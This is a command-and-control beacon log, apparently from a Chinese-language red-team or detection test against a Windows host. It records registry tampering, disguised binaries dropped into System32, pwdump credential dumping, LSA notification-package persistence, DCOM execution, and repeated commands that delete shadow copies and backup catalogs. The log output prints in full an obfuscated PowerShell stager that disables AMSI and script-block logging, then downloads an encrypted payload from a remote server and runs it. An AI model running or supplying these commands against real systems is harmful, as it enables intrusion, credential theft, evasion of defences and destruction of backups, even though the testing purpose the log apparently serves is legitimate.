02/08 09:34:21 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a *; pid: 2636; os: Windows; version: 6.1; beacon arch: x86 (x64)
02/08 09:47:44 [task] Modify Registry with Reg.exe method 1
02/08 09:47:44 [task] Tasked beacon to execute: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\ExplorerAdvanced /t REG_DWORD /v HideFileExt /d 1 /f
02/08 09:48:16 [checkin] host called home, sent: 181 bytes
02/08 10:18:43 [task] Tasked beacon to make directory c:\RedTeam\
02/08 10:18:43 [task] cd c:\RedTeam\
02/08 10:18:43 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1112_recover.exe as T1112_recover.exe
02/08 10:18:43 [indicator] file: 92e1ea76e101bd859474574b571859e9 7680 bytes T1112_recover.exe
02/08 10:18:43 [task] 恢复 
02/08 10:18:43 [task] Tasked beacon to run: c:\RedTeam\T1112_recover.exe
02/08 10:19:18 [checkin] host called home, sent: 7806 bytes
02/08 10:23:43 [task] 非系统目录运行svchost
02/08 10:23:43 [task] Tasked beacon to make directory c:\RedTeam\
02/08 10:23:44 [task] cd c:\RedTeam\
02/08 10:23:44 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\svchost.exe as svchost.exe
02/08 10:23:44 [indicator] file: a5381751f68c2a8419151e1c82773502 169472 bytes svchost.exe
02/08 10:23:44 [task] Tasked beacon to execute: c:\RedTeam\svchost.exe
02/08 10:24:19 [checkin] host called home, sent: 169563 bytes
02/08 10:29:03 [task] 适用工具连接127.0.0.1:3389
02/08 10:29:03 [task] Tasked beacon to make directory c:\RedTeam\
02/08 10:29:03 [task] cd c:\RedTeam\
02/08 10:29:03 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\127PortExchange.exe as 127PortExchange.exe
02/08 10:29:03 [indicator] file: 7038e514a0f0c0edb380a48bd87d375b 77312 bytes 127PortExchange.exe
02/08 10:29:03 [task] Tasked beacon to execute: C:\RedTeam\127PortExchange.exe
02/08 10:29:19 [checkin] host called home, sent: 77419 bytes
02/08 10:35:46 [task] Tasked beacon to make directory c:\RedTeam\
02/08 10:35:46 [task] cd c:\RedTeam\
02/08 10:35:47 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\powershell.exe as powershell.exe
02/08 10:35:47 [indicator] file: 852d67a27e454bd389fa7f02a8cbe23f 473600 bytes powershell.exe
02/08 10:35:47 [task] Tasked beacon to run: C:\RedTeam\powershell.exe calc
02/08 10:36:01 [task] Tasked beacon to make directory C:\Windows\System32\
02/08 10:36:01 [task] cd C:\Windows\System32\
02/08 10:36:03 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\powershell2.exe as powershell2.exe
02/08 10:36:03 [indicator] file: 852d67a27e454bd389fa7f02a8cbe23f 473600 bytes powershell2.exe
02/08 10:36:03 [task] Tasked beacon to run: C:\Windows\System32\powershell2.exe calc
02/08 10:36:19 [checkin] host called home, sent: 947479 bytes
02/08 10:48:09 [task] 测试 IOAT1098_001 
02/08 10:48:19 [task] 测试 IOAT1098_001_Rule 方法2
02/08 10:48:19 [task] Tasked beacon to execute: net user Account /add
02/08 10:48:20 [checkin] host called home, sent: 84 bytes
02/08 10:48:21 [output]
received output:
帐户已经存在。

请键入 NET HELPMSG 2224 以获得更多的帮助。



02/08 10:49:11 [task] 传输dump工具到服务端并执行
02/08 10:49:11 [task] Tasked beacon to make directory c:\RedTeam\
02/08 10:49:12 [task] cd c:\RedTeam\
02/08 10:49:12 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\pwdump.exe as pwdump.exe
02/08 10:49:12 [indicator] file: a5381751f68c2a8419151e1c82773502 169472 bytes pwdump.exe
02/08 10:49:12 [task] Tasked beacon to execute: c:\redteam\pwdump.exe
02/08 10:49:21 [checkin] host called home, sent: 169561 bytes
02/08 10:55:02 [task] cd c:\Windows\System32
02/08 10:55:02 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe QUERY HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "Notification Packages"
02/08 10:55:02 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "Notification Packages" /t REG_MULTI_SZ /d "scecli\0aisakeng" /f
02/08 10:55:21 [checkin] host called home, sent: 390 bytes
02/08 10:55:21 [output]
received output:

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
    Notification Packages    REG_MULTI_SZ    scecli\0aisakeng


c:\Windows\System32>

02/08 10:55:21 [output]
received output:
操作成功完成。

c:\Windows\System32>

02/08 11:01:00 [task] Tasked beacon to run: sc start DcomLaunch
02/08 11:01:00 [task] Tasked beacon to run: $Com=[Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application","localhost"));$Com.Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
02/08 11:01:10 [task] Tasked beacon to make directory c:\RedTeam\
02/08 11:01:10 [task] cd c:\RedTeam\
02/08 11:01:10 [task] cd c:\RedTeam
02/08 11:01:10 [task] Tasked beacon to run: rar a test1.rar C:/ReadTeam/ 
02/08 11:01:21 [checkin] host called home, sent: 733 bytes
02/08 11:01:23 [output]
received output:
[SC] StartService 失败 1056:

服务的实例已在运行中。



02/08 11:01:23 [output]
received output:

RAR 5.80 x64    版权所有 (C) 1993-2019 Alexander Roshal    5 十二月 2019
试用版             输入 'rar -?' 获得帮助

评估版本。请注册。

正在创建 archive test1.rar

警告: 没有文件


02/08 11:04:27 [task] 
02/08 11:04:27 [task] Tasked beacon to run: wmic shadowcopy delete &&wbadmin delete catalog && vssadmin delete shadows /all
02/08 11:04:27 [task] Tasked beacon to run: n
02/08 11:05:23 [checkin] host called home, sent: 142 bytes
02/08 11:05:24 [output]
received output:
ERROR:
Description = Initialization failure


02/08 11:05:24 [output]
received output:
'n' 不是内部或外部命令，也不是可运行的程序
或批处理文件。


02/08 11:06:23 [task] 
02/08 11:06:23 [task] Tasked beacon to run: wmic shadowcopy delete &&wbadmin delete catalog && vssadmin delete shadows /all /f
02/08 11:06:24 [checkin] host called home, sent: 113 bytes
02/08 11:06:24 [output]
received output:
ERROR:
Description = Initialization failure


02/08 11:06:51 [task] 
02/08 11:06:51 [task] Tasked beacon to run: wmic shadowcopy delete &&wbadmin delete catalog && vssadmin delete shadows /all
02/08 11:07:25 [checkin] host called home, sent: 110 bytes
02/08 11:07:25 [output]
received output:
ERROR:
Description = Initialization failure


02/08 11:13:14 [task] 
02/08 11:13:14 [task] Tasked Beacon to execute: wmic shadowcopy delete &&wbadmin delete catalog && vssadmin delete shadows /all in a high integrity context
02/08 11:13:25 [checkin] host called home, sent: 75478 bytes
02/08 11:13:25 [output]
received output:
[-] You're already in a high integrity context.

02/08 14:19:07 [task] execute bypass UAC With Powershell add -Enc Command
02/08 14:19:37 [checkin] host called home, sent: 4033 bytes
02/08 14:20:47 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">使用“1”个参数调用“DownloadData”时发生异常:“无法连接到远程服务器”_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 1401_x000D__x000A_</S><S S="Error">+ IF($PSVERSIOnTable.PSVersIon.MAjor -GE 3){$GPS=[ref].AssEmBlY.GEtTYpE('System_x000D__x000A_</S><S S="Error">.Management.Automation.Utils')."GetFiE`Ld"('cachedGroupPolicySettings','N'+'onP_x000D__x000A_</S><S S="Error">ublic,Static').GEtVaLUE($nUll);If($GPS['ScriptB'+'lockLogging']){$GPS['ScriptB'_x000D__x000A_</S><S S="Error">+'lockLogging']['EnableScriptB'+'lockLogging']=0;$GPS['ScriptB'+'lockLogging'][_x000D__x000A_</S><S S="Error">'EnableScriptBlockInvocationLogging']=0}ELse{[ScrIPTBLoCk]."GetFIe`ld"('signatu_x000D__x000A_</S><S S="Error">res','N'+'onPublic,Static').SetVALue($nUlL,(New-OBJect CoLlECTiONs.GEnErIC.HAsH_x000D__x000A_</S><S S="Error">Set[STring]))}[ReF].ASseMbly.GETTYPe('System.Management.Automation.AmsiUtils')|_x000D__x000A_</S><S S="Error">?{$_}|%{$_.GEtFiElD('amsiInitFailed','NonPublic,Static').SETVALUe($nULL,$trUE)}_x000D__x000A_</S><S S="Error">;};[SYSteM.NeT.SERvICEPoiNTManagEr]::ExPECT100ContInue=0;$wC=New-ObJecT SyStem._x000D__x000A_</S><S S="Error">NEt.WEbCLIENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) lik_x000D__x000A_</S><S S="Error">e Gecko';$wc.HEadErS.ADd('User-Agent',$u);$WC.PROXy=[SystEm.NeT.WEbREqUEsT]::DE_x000D__x000A_</S><S S="Error">FaulTWEbProxY;$WC.PROXy.CREDeNTiALs = [SYstEm.NEt.CrEDENtiaLCachE]::DeFAUlTNEtw_x000D__x000A_</S><S S="Error">oRkCREDENTialS;$Script:Proxy = $wc.Proxy;$K=[SystEm.TeXT.EnCODing]::ASCII.GetBy_x000D__x000A_</S><S S="Error">TEs('[e6z2!pbTr75sE(3PHSyX^c{an&lt;F_h@+');$R={$D,$K=$ArGs;$S=0..255;0..255|%{$J=(_x000D__x000A_</S><S S="Error">$J+$S[$_]+$K[$_%$K.CounT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;_x000D__x000A_</S><S S="Error">$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXOr$S[($S[$I]+$S[$H])%256]}}_x000D__x000A_</S><S S="Error">;$ser='http://192.168.233.139:4444';$t='/news.php';$Wc.HEAdeRs.ADD("Cookie","se_x000D__x000A_</S><S S="Error">ssion=xfw+K3eCYz0EgUgNW18BFYPvbLQ=");$datA=$WC.DoWNlOADDATA &lt;&lt;&lt;&lt; ($SeR+$T);$iv=_x000D__x000A_</S><S S="Error">$dATA[0..3];$data=$dAta[4..$daTa.lEngth];-jOIn[Char[]](&amp; $R $data ($IV+$K))|IEX_x000D__x000A_</S><S S="Error">    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : DotNetMethodException_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S><S S="Error">无法对空数组进行索引。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 1421_x000D__x000A_</S><S S="Error">+ IF($PSVERSIOnTable.PSVersIon.MAjor -GE 3){$GPS=[ref].AssEmBlY.GEtTYpE('System_x000D__x000A_</S><S S="Error">.Management.Automation.Utils')."GetFiE`Ld"('cachedGroupPolicySettings','N'+'onP_x000D__x000A_</S><S S="Error">ublic,Static').GEtVaLUE($nUll);If($GPS['ScriptB'+'lockLogging']){$GPS['ScriptB'_x000D__x000A_</S><S S="Error">+'lockLogging']['EnableScriptB'+'lockLogging']=0;$GPS['ScriptB'+'lockLogging'][_x000D__x000A_</S><S S="Error">'EnableScriptBlockInvocationLogging']=0}ELse{[ScrIPTBLoCk]."GetFIe`ld"('signatu_x000D__x000A_</S><S S="Error">res','N'+'onPublic,Static').SetVALue($nUlL,(New-OBJect CoLlECTiONs.GEnErIC.HAsH_x000D__x000A_</S><S S="Error">Set[STring]))}[ReF].ASseMbly.GETTYPe('System.Management.Automation.AmsiUtils')|_x000D__x000A_</S><S S="Error">?{$_}|%{$_.GEtFiElD('amsiInitFailed','NonPublic,Static').SETVALUe($nULL,$trUE)}_x000D__x000A_</S><S S="Error">;};[SYSteM.NeT.SERvICEPoiNTManagEr]::ExPECT100ContInue=0;$wC=New-ObJecT SyStem._x000D__x000A_</S><S S="Error">NEt.WEbCLIENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) lik_x000D__x000A_</S><S S="Error">e Gecko';$wc.HEadErS.ADd('User-Agent',$u);$WC.PROXy=[SystEm.NeT.WEbREqUEsT]::DE_x000D__x000A_</S><S S="Error">FaulTWEbProxY;$WC.PROXy.CREDeNTiALs = [SYstEm.NEt.CrEDENtiaLCachE]::DeFAUlTNEtw_x000D__x000A_</S><S S="Error">oRkCREDENTialS;$Script:Proxy = $wc.Proxy;$K=[SystEm.TeXT.EnCODing]::ASCII.GetBy_x000D__x000A_</S><S S="Error">TEs('[e6z2!pbTr75sE(3PHSyX^c{an&lt;F_h@+');$R={$D,$K=$ArGs;$S=0..255;0..255|%{$J=(_x000D__x000A_</S><S S="Error">$J+$S[$_]+$K[$_%$K.CounT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;_x000D__x000A_</S><S S="Error">$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXOr$S[($S[$I]+$S[$H])%256]}}_x000D__x000A_</S><S S="Error">;$ser='http://192.168.233.139:4444';$t='/news.php';$Wc.HEAdeRs.ADD("Cookie","se_x000D__x000A_</S><S S="Error">ssion=xfw+K3eCYz0EgUgNW18BFYPvbLQ=");$datA=$WC.DoWNlOADDATA($SeR+$T);$iv=$dATA[_x000D__x000A_</S><S S="Error"> &lt;&lt;&lt;&lt; 0..3];$data=$dAta[4..$daTa.lEngth];-jOIn[Char[]](&amp; $R $data ($IV+$K))|IEX_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidOperation: (System.Object[]:Object[]) [], _x000D__x000A_</S><S S="Error">    RuntimeException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : NullArray_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S><S S="Error">无法对空数组进行索引。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 1439_x000D__x000A_</S><S S="Error">+ IF($PSVERSIOnTable.PSVersIon.MAjor -GE 3){$GPS=[ref].AssEmBlY.GEtTYpE('System_x000D__x000A_</S><S S="Error">.Management.Automation.Utils')."GetFiE`Ld"('cachedGroupPolicySettings','N'+'onP_x000D__x000A_</S><S S="Error">ublic,Static').GEtVaLUE($nUll);If($GPS['ScriptB'+'lockLogging']){$GPS['ScriptB'_x000D__x000A_</S><S S="Error">+'lockLogging']['EnableScriptB'+'lockLogging']=0;$GPS['ScriptB'+'lockLogging'][_x000D__x000A_</S><S S="Error">'EnableScriptBlockInvocationLogging']=0}ELse{[ScrIPTBLoCk]."GetFIe`ld"('signatu_x000D__x000A_</S><S S="Error">res','N'+'onPublic,Static').SetVALue($nUlL,(New-OBJect CoLlECTiONs.GEnErIC.HAsH_x000D__x000A_</S><S S="Error">Set[STring]))}[ReF].ASseMbly.GETTYPe('System.Management.Automation.AmsiUtils')|_x000D__x000A_</S><S S="Error">?{$_}|%{$_.GEtFiElD('amsiInitFailed','NonPublic,Static').SETVALUe($nULL,$trUE)}_x000D__x000A_</S><S S="Error">;};[SYSteM.NeT.SERvICEPoiNTManagEr]::ExPECT100ContInue=0;$wC=New-ObJecT SyStem._x000D__x000A_</S><S S="Error">NEt.WEbCLIENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) lik_x000D__x000A_</S><S S="Error">e Gecko';$wc.HEadErS.ADd('User-Agent',$u);$WC.PROXy=[SystEm.NeT.WEbREqUEsT]::DE_x000D__x000A_</S><S S="Error">FaulTWEbProxY;$WC.PROXy.CREDeNTiALs = [SYstEm.NEt.CrEDENtiaLCachE]::DeFAUlTNEtw_x000D__x000A_</S><S S="Error">oRkCREDENTialS;$Script:Proxy = $wc.Proxy;$K=[SystEm.TeXT.EnCODing]::ASCII.GetBy_x000D__x000A_</S><S S="Error">TEs('[e6z2!pbTr75sE(3PHSyX^c{an&lt;F_h@+');$R={$D,$K=$ArGs;$S=0..255;0..255|%{$J=(_x000D__x000A_</S><S S="Error">$J+$S[$_]+$K[$_%$K.CounT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;_x000D__x000A_</S><S S="Error">$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXOr$S[($S[$I]+$S[$H])%256]}}_x000D__x000A_</S><S S="Error">;$ser='http://192.168.233.139:4444';$t='/news.php';$Wc.HEAdeRs.ADD("Cookie","se_x000D__x000A_</S><S S="Error">ssion=xfw+K3eCYz0EgUgNW18BFYPvbLQ=");$datA=$WC.DoWNlOADDATA($SeR+$T);$iv=$dATA[_x000D__x000A_</S><S S="Error">0..3];$data=$dAta[ &lt;&lt;&lt;&lt; 4..$daTa.lEngth];-jOIn[Char[]](&amp; $R $data ($IV+$K))|IEX_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidOperation: (System.Object[]:Object[]) [], _x000D__x000A_</S><S S="Error">    RuntimeException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : NullArray_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S><S S="Error">无法将“Q”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请检查名称的拼写_x000D__x000A_</S><S S="Error">，如果包括路径，请确保路径正确，然后重试。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 2_x000D__x000A_</S><S S="Error">+ Q &lt;&lt;&lt;&lt; _x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (Q:String) [], CommandNotFoundEx _x000D__x000A_</S><S S="Error">   ception_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : CommandNotFoundException_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

